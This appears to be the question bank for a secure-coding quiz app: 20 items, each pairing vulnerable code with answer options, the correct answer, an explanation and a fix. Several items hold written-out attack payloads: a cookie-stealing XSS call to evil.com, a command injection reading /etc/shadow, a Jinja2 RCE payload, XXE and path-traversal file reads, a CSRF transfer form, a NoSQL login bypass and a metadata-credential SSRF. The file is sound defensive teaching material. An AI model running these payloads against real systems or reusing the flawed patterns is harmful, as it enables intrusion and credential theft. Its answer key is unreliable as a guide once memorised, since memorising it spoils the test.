// src/data/questions.ts
// src/data/questions.ts
import type { Category, Question } from '../types';

export const CATEGORIES: Category[] = [
  "Injection",
  "Frontend & Web",
  "Authentication & Secrets",
  "Architecture & Config",
  "Data Integrity",
  "Access Control"
];

export const QUESTIONS: Question[] = [
  {
    id: 1,
    category: "Injection",
    title: "SQL Injection",
    language: "Python",
    difficulty: "CRITICAL",
    timeLimit: 45,
    diffColor: "#EF4444",
    code: `def get_user(username):
    query = "SELECT * FROM users WHERE "
            "username = '" + username + "'"
    return db.execute(query)

# Called with user input:
get_user("admin' OR '1'='1")`,
    question: "What vulnerability exists in this database query?",
    options: [
      "Missing input validation length check",
      "SQL Injection via unsanitized string concatenation",
      "Missing database connection pooling",
      "Incorrect SQL syntax for multi-line strings",
    ],
    correct: 1,
    explanation: "User input is concatenated directly into the SQL string. An attacker can inject 'admin' OR '1'='1' to bypass authentication and dump the entire users table.",
    fix: `def get_user(username):\n    query = "SELECT * FROM users WHERE username = ?"\n    return db.execute(query, (username,))  # Parameterized query`,
  },
  {
    id: 2,
    category: "Frontend & Web",
    title: "Cross-Site Scripting (XSS)",
    language: "JavaScript",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `// Express.js route handler
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(\`<h2>Results for: \${query}</h2>\`);
});`,
    question: "What attack vector does this endpoint expose?",
    options: [
      "Server-Side Request Forgery (SSRF)",
      "Reflected Cross-Site Scripting (XSS)",
      "HTTP Response Splitting",
      "Directory Traversal",
    ],
    correct: 1,
    explanation: "The query param is embedded directly in HTML without escaping. Visiting ?q=<script>document.location='http://evil.com?c='+document.cookie</script> steals session cookies.",
    fix: `import escapeHtml from 'escape-html';\n\napp.get('/search', (req, res) => {\n  const query = escapeHtml(req.query.q || '');\n  res.send(\`<h2>Results for: \${query}</h2>\`);\n});`,
  },
  {
    id: 3,
    category: "Authentication & Secrets",
    title: "Hardcoded Credentials",
    language: "Java",
    difficulty: "CRITICAL",
    timeLimit: 45,
    diffColor: "#EF4444",
    code: `public class DatabaseConfig {
    private static final String DB_URL = "jdbc:mysql://prod:3306/users";
    private static final String DB_USER = "root";
    private static final String DB_PASS = "Sup3rS3cr3t!2024";
    
    public static Connection getConnection() {
        return DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
    }
}`,
    question: "What is the primary security risk in this Java class?",
    options: [
      "Using JDBC instead of JPA/Hibernate",
      "Static methods instead of dependency injection",
      "Hardcoded production credentials in source code",
      "Missing connection timeout configuration",
    ],
    correct: 2,
    explanation: "Credentials committed to source code are exposed to anyone with repo access, in git history forever, and in any deployment artifact.",
    fix: `public static Connection getConnection() {\n    String url  = System.getenv("DB_URL");\n    String user = System.getenv("DB_USER");\n    String pass = System.getenv("DB_PASS");\n    return DriverManager.getConnection(url, user, pass);\n}`,
  },
  {
    id: 4,
    category: "Architecture & Config",
    title: "Path Traversal",
    language: "Node.js",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `app.get('/file', (req, res) => {
  const filename = req.query.name;
  const filePath = path.join('/var/www/files/', filename);
  res.sendFile(filePath);
});
// Request: GET /file?name=../../../etc/passwd`,
    question: "What vulnerability allows reading /etc/passwd here?",
    options: [
      "Missing file extension validation",
      "Path traversal via directory sequences in filename",
      "Insecure file permissions on the server",
      "Missing CORS headers on the endpoint",
    ],
    correct: 1,
    explanation: "The filename ../../../etc/passwd traverses outside the intended directory. path.join doesn't prevent this.",
    fix: `app.get('/file', (req, res) => {\n  const filename = path.basename(req.query.name); // strips ../ \n  const filePath = path.join('/var/www/files/', filename);\n  res.sendFile(filePath);\n});`,
  },
  {
    id: 5,
    category: "Data Integrity",
    title: "Insecure Deserialization",
    language: "PHP",
    difficulty: "CRITICAL",
    timeLimit: 45,
    diffColor: "#EF4444",
    code: `<?php
$userData = unserialize(base64_decode($_COOKIE['user_data']));
echo "Welcome, " . $userData['username'];

class Logger {
    public $logFile;
    public function __destruct() {
        file_put_contents($this->logFile, "logged");
    }
}
?>`,
    question: "What makes this deserialization dangerous?",
    options: [
      "Base64 encoding is not secure encryption",
      "Cookie size limits may truncate the data",
      "Unserializing untrusted data enables remote code execution",
      "The Logger class should use static methods",
    ],
    correct: 2,
    explanation: "PHP unserialize() on attacker-controlled input triggers magic methods (__destruct). An attacker can craft an object to achieve RCE.",
    fix: `// Use JSON and signed tokens instead of native serialization\n$userData = json_decode(base64_decode($data), true);`,
  },
  {
    id: 6,
    category: "Injection",
    title: "Command Injection",
    language: "Python",
    difficulty: "CRITICAL",
    timeLimit: 45,
    diffColor: "#EF4444",
    code: `import os
from flask import Flask, request
app = Flask(__name__)

@app.route('/ping')
def ping():
    host = request.args.get('host', '')
    result = os.popen(f'ping -c 4 {host}').read()
    return f'<pre>{result}</pre>'`,
    question: "What attack is possible via the 'host' parameter?",
    options: [
      "HTTP Parameter Pollution",
      "OS Command Injection via shell metacharacters",
      "Denial of Service via ICMP flood",
      "Server-Side Template Injection",
    ],
    correct: 1,
    explanation: "Any shell metacharacter (;, |, &&) can chain arbitrary commands (e.g., host=8.8.8.8;cat /etc/shadow).",
    fix: `import subprocess\ndef ping():\n    host = request.args.get('host', '')\n    result = subprocess.run(['ping', '-c', '4', host], capture_output=True)\n    return result.stdout`,
  },
  {
    id: 7,
    category: "Access Control",
    title: "Broken Access Control (IDOR)",
    language: "JavaScript",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `app.get('/api/orders/:orderId', async (req, res) => {
  const { orderId } = req.params;
  const order = await db.orders.findById(orderId);
  
  if (!order) return res.status(404).json({ error: 'Not found' });
  
  res.json(order);  // Returns order to any logged-in user
});`,
    question: "What vulnerability allows User A to see User B's orders?",
    options: [
      "Missing rate limiting",
      "Order IDs should be UUIDs",
      "No authorization check that the order belongs to requesting user",
      "Missing input sanitization",
    ],
    correct: 2,
    explanation: "This is an Insecure Direct Object Reference (IDOR). Any authenticated user can access any order by changing the ID.",
    fix: `// Add Authorization check!\nif (order.userId !== req.user.id) {\n    return res.status(403).json({ error: 'Forbidden' });\n}`,
  },
  {
    id: 8,
    category: "Authentication & Secrets",
    title: "JWT Algorithm Confusion",
    language: "JavaScript",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `const jwt = require('jsonwebtoken');

app.post('/verify', (req, res) => {
  const { token } = req.body;
  const publicKey = fs.readFileSync('public.pem');
  
  try {
    // Vulnerable: accepts any algorithm from token header
    const payload = jwt.verify(token, publicKey);
    res.json({ valid: true, user: payload });
  } catch (e) { res.json({ valid: false }); }
});`,
    question: "How can an attacker forge a valid JWT with this code?",
    options: [
      "By brute-forcing the public key",
      "By setting alg:none in the header",
      "By using the public key as HMAC secret with alg:HS256",
      "By replaying an expired token",
    ],
    correct: 2,
    explanation: "Algorithm confusion attack: the attacker changes the header to alg:HS256, then signs with the PUBLIC key. The server uses the public key as the HMAC secret.",
    fix: `const payload = jwt.verify(token, publicKey, {\n  algorithms: ['RS256'] // Explicitly whitelist algorithm\n});`,
  },
  {
    id: 9,
    category: "Frontend & Web",
    title: "Cross-Site Request Forgery (CSRF)",
    language: "HTML",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `<form action="https://bank.com/transfer" method="POST" id="steal">
  <input type="hidden" name="to_account" value="attacker_acct">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('steal').submit();</script>`,
    question: "Why would this attack succeed if the victim is currently logged into bank.com?",
    options: [
      "The bank lacks CORS headers.",
      "The browser automatically includes the victim's session cookies.",
      "The attacker's site bypassed the Same-Origin Policy.",
      "The form uses HTTP instead of HTTPS.",
    ],
    correct: 1,
    explanation: "The browser automatically sends the user's session cookies with the cross-origin request. Without anti-CSRF tokens, the server processes it as the victim.",
    fix: `\n<input type="hidden" name="csrf_token" value="abc123xyz_unpredictable_token">`,
  },
  {
    id: 10,
    category: "Architecture & Config",
    title: "Server-Side Request Forgery (SSRF)",
    language: "Python",
    difficulty: "CRITICAL",
    timeLimit: 45,
    diffColor: "#EF4444",
    code: `import requests
from flask import Flask, request

@app.route('/fetch-preview')
def fetch_preview():
    url = request.args.get('url')
    response = requests.get(url)
    return response.content

# Attack: /fetch-preview?url=http://169.254.169.254/latest/meta-data/`,
    question: "What is the attacker trying to achieve with the URL in the comment?",
    options: [
      "Execute a buffer overflow on the local network",
      "Bypass the web application firewall (WAF)",
      "Access internal cloud metadata and steal temporary IAM credentials",
      "Perform a Denial of Service via recursive DNS queries",
    ],
    correct: 2,
    explanation: "By controlling the URL the server fetches, the attacker forces the server to query the AWS metadata IP (169.254.169.254), exposing internal credentials.",
    fix: `// Validate URL, resolve IP, and block private/internal IP ranges (e.g., 10.x.x.x, 169.254.x.x)`,
  },
  {
    id: 11,
    category: "Authentication & Secrets",
    title: "Weak Password Hashing",
    language: "PHP",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `function register_user($username, $password) {
    global $db;
    
    // Hash the password before storing
    $hashed_password = md5($password);
    
    $stmt = $db->prepare("INSERT INTO users (user, pass) VALUES (?, ?)");
    $stmt->execute([$username, $hashed_password]);
}`,
    question: "Why is this password storage mechanism considered highly insecure?",
    options: [
      "MD5 is prone to SQL injection vulnerabilities.",
      "MD5 is a fast, unsalted hash function, vulnerable to dictionary attacks.",
      "The execute() function requires string concatenation for MD5.",
      "MD5 generates unpredictable string lengths.",
    ],
    correct: 1,
    explanation: "MD5 is cryptographically broken and computationally fast. It also lacks a unique salt per user, meaning identical passwords have identical hashes.",
    fix: `// Use bcrypt or argon2id with a built-in random salt\n$hashed_password = password_hash($password, PASSWORD_DEFAULT);`,
  },
  {
    id: 12,
    category: "Data Integrity",
    title: "XML External Entity (XXE)",
    language: "Java",
    difficulty: "CRITICAL",
    timeLimit: 45,
    diffColor: "#EF4444",
    code: `public void parseXml(InputStream xmlStream) throws Exception {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    DocumentBuilder builder = factory.newDocumentBuilder();
    Document doc = builder.parse(xmlStream);
}

/* Attack payload:
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo> */`,
    question: "What vulnerability is present in this standard XML parser configuration?",
    options: [
      "It fails to validate the XML against an XSD schema.",
      "It processes external entities by default, allowing local file inclusion.",
      "It is vulnerable to XPath injection due to standard libraries.",
      "The DocumentBuilder consumes excessive memory.",
    ],
    correct: 1,
    explanation: "Many XML parsers resolve external entities by default. The attacker defines an entity pointing to a local file, which the parser reads and embeds.",
    fix: `// Disable DTDs completely to prevent XXE\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`,
  },
  {
    id: 13,
    category: "Architecture & Config",
    title: "CORS Misconfiguration",
    language: "Node.js",
    difficulty: "MEDIUM",
    timeLimit: 75,
    diffColor: "#EAB308",
    code: `const cors = require('cors');

app.use(cors({
  origin: (origin, callback) => {
    // Check if origin ends with company.com
    if (origin && origin.endsWith('company.com')) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));`,
    question: "How can an attacker bypass this CORS policy?",
    options: [
      "By sending a preflight OPTIONS request",
      "By registering a domain like 'evilcompany.com'",
      "By omitting the Origin header entirely",
      "By using an iframe to load the page",
    ],
    correct: 1,
    explanation: "The endsWith() check is flawed. An attacker can register 'evilcompany.com' or 'attacker.company.com.evil.net' (if regex is used poorly). Always match exact subdomains or strictly parse the origin.",
    fix: `// Check against an exact array of allowed origins\nconst allowedOrigins = ['https://app.company.com', 'https://api.company.com'];\nif (allowedOrigins.includes(origin)) { callback(null, true); }`,
  },
  {
    id: 14,
    category: "Frontend & Web",
    title: "Prototype Pollution",
    language: "JavaScript",
    difficulty: "CRITICAL",
    timeLimit: 45,
    diffColor: "#EF4444",
    code: `function mergeDeep(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      mergeDeep(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
// req.body = {"__proto__": {"isAdmin": true}}
mergeDeep({}, req.body);`,
    question: "What happens when the provided JSON is merged?",
    options: [
      "The server crashes due to an infinite loop.",
      "The Global Object prototype is modified, affecting all objects.",
      "The target object becomes immutable.",
      "A prototype closure bypasses garbage collection.",
    ],
    correct: 1,
    explanation: "Because the function doesn't check for '__proto__', the assignment `target['__proto__']['isAdmin'] = true` pollutes the global Object prototype. Now, EVERY object in the Node process has `.isAdmin === true`.",
    fix: `// Block prototype keys\nif (key === '__proto__' || key === 'constructor' || key === 'prototype') {\n  continue;\n}`,
  },
  {
    id: 15,
    category: "Frontend & Web",
    title: "Unvalidated Redirects",
    language: "PHP",
    difficulty: "MEDIUM",
    timeLimit: 75,
    diffColor: "#EAB308",
    code: `<?php
// login.php
session_start();

if (login_successful($_POST['user'], $_POST['pass'])) {
    $_SESSION['logged_in'] = true;
    
    // Redirect back to the page they came from
    $next = $_GET['next'] ?? '/dashboard.php';
    header("Location: " . $next);
    exit;
}
?>`,
    question: "What is the security risk of using the 'next' parameter directly?",
    options: [
      "It allows HTTP Header Injection.",
      "It enables Open Redirect for phishing attacks.",
      "It exposes session IDs in the URL.",
      "It causes an infinite redirect loop.",
    ],
    correct: 1,
    explanation: "An attacker sends a link like `login.php?next=http://evil.com`. After the victim logs in, they are seamlessly redirected to the attacker's phishing page, believing they are still on the legitimate site.",
    fix: `// Ensure the redirect is a relative path or matches a whitelist\n$next = $_GET['next'] ?? '/dashboard.php';\nif (!preg_match('/^\/[a-zA-Z0-9_\-\.]+$/', $next)) {\n    $next = '/dashboard.php';\n}`,
  },
  {
    id: 16,
    category: "Architecture & Config",
    title: "Missing Rate Limiting",
    language: "Node.js",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `app.post('/api/auth/reset-password', async (req, res) => {
  const { email } = req.body;
  const user = await db.users.findOne({ email });
  
  if (user) {
    const code = generate6DigitCode(); // e.g. 123456
    await emailService.sendResetCode(user.email, code);
  }
  
  res.json({ message: "If the email exists, a code was sent." });
});`,
    question: "Besides email flooding, what is the critical flaw if the verification endpoint also lacks rate limits?",
    options: [
      "A 6-digit code can be brute-forced easily.",
      "The endpoint is vulnerable to timing attacks.",
      "The database connection pool will exhaust.",
      "The random number generator is predictable.",
    ],
    correct: 0,
    explanation: "A 6-digit code only has 1,000,000 possibilities. Without rate limiting on the verification endpoint, an attacker can submit all 1 million combinations in minutes and take over the account.",
    fix: `// Use a rate limiter middleware\nconst rateLimit = require('express-rate-limit');\napp.use('/api/auth/', rateLimit({ windowMs: 15 * 60 * 1000, max: 5 }));`,
  },
  {
    id: 17,
    category: "Injection",
    title: "Server-Side Template Injection (SSTI)",
    language: "Python",
    difficulty: "CRITICAL",
    timeLimit: 45,
    diffColor: "#EF4444",
    code: `from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'Guest')
    # Vulnerable pattern
    template = f'<h1>Hello, {name}!</h1>'
    return render_template_string(template)`,
    question: "What payload could an attacker use to exploit this via Jinja2?",
    options: [
      "<script>alert(1)</script>",
      "'; DROP TABLE users--",
      "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
      "../etc/passwd",
    ],
    correct: 2,
    explanation: "Because user input is concatenated into the template string BEFORE it is parsed, the template engine executes the Jinja2 payload `{{ ... }}`, which can access Python's underlying OS modules for RCE.",
    fix: `// Pass the variable as context, not string concatenation\ntemplate = '<h1>Hello, {{ name }}!</h1>'\nreturn render_template_string(template, name=name)`,
  },
  {
    id: 18,
    category: "Frontend & Web",
    title: "Clickjacking",
    language: "HTML",
    difficulty: "MEDIUM",
    timeLimit: 75,
    diffColor: "#EAB308",
    code: `HTTP/1.1 200 OK
Content-Type: text/html
Cache-Control: no-cache

<!DOCTYPE html>
<html>
<body>
  <h2>Delete Your Account</h2>
  <form action="/account/delete" method="POST">
    <button type="submit">Permanently Delete</button>
  </form>
</body>
</html>`,
    question: "What HTTP response header is missing to prevent UI Redressing (Clickjacking)?",
    options: [
      "Strict-Transport-Security",
      "X-Frame-Options or Content-Security-Policy: frame-ancestors",
      "X-Content-Type-Options: nosniff",
      "Access-Control-Allow-Origin",
    ],
    correct: 1,
    explanation: "Without `X-Frame-Options: DENY` or `CSP: frame-ancestors 'none'`, an attacker can load this page inside an invisible `<iframe>` on their site, tricking the user into clicking the delete button while they think they are clicking a fake button.",
    fix: `// Add headers to the response\nres.setHeader('X-Frame-Options', 'DENY');\nres.setHeader('Content-Security-Policy', "frame-ancestors 'none'");`,
  },
  {
    id: 19,
    category: "Injection",
    title: "NoSQL Injection",
    language: "Node.js",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `// Express + MongoDB (Mongoose)
app.post('/api/login', async (req, res) => {
  // req.body = { username: "admin", password: { "$gt": "" } }
  
  const user = await User.findOne({
    username: req.body.username,
    password: req.body.password
  });

  if (user) {
    res.json({ token: generateToken(user) });
  } else {
    res.status(401).send('Invalid');
  }
});`,
    question: "How does the payload in the comment bypass authentication?",
    options: [
      "It causes an error that crashes the database service.",
      "The $gt operator evaluates to true for any non-empty password.",
      "It overrides the username field.",
      "It executes a JavaScript function inside MongoDB.",
    ],
    correct: 1,
    explanation: "MongoDB queries treat objects like `{$gt: \"\"}` as query operators (Greater Than). If the password is not cast to a string securely, MongoDB returns the user record where the password is greater than an empty string, bypassing the password check.",
    fix: `// Force variables to be strings before querying\nconst username = String(req.body.username);\nconst password = String(req.body.password);`,
  },
  {
    id: 20,
    category: "Architecture & Config",
    title: "Insufficient Logging",
    language: "Python",
    difficulty: "MEDIUM",
    timeLimit: 75,
    diffColor: "#EAB308",
    code: `def process_payment(user_id, amount, card_data):
    try:
        charge_stripe_api(amount, card_data)
        db.update_balance(user_id, amount)
        return True
    except Exception as e:
        # Something went wrong, return generic error
        return False`,
    question: "What is the primary security consequence of this error handling?",
    options: [
      "It leaks sensitive financial data to the user.",
      "It creates an unhandled race condition.",
      "A successful attack or persistent error leaves no forensic trace.",
      "It prevents the database from rolling back.",
    ],
    correct: 2,
    explanation: "Silently swallowing exceptions prevents security teams from detecting active attacks (like parameter tampering or stolen cards) and makes forensic incident response impossible.",
    fix: `import logging\nexcept Exception as e:\n    logging.error(f"Payment failed for user {user_id}. Error: {str(e)}")\n    return False`,
  }
];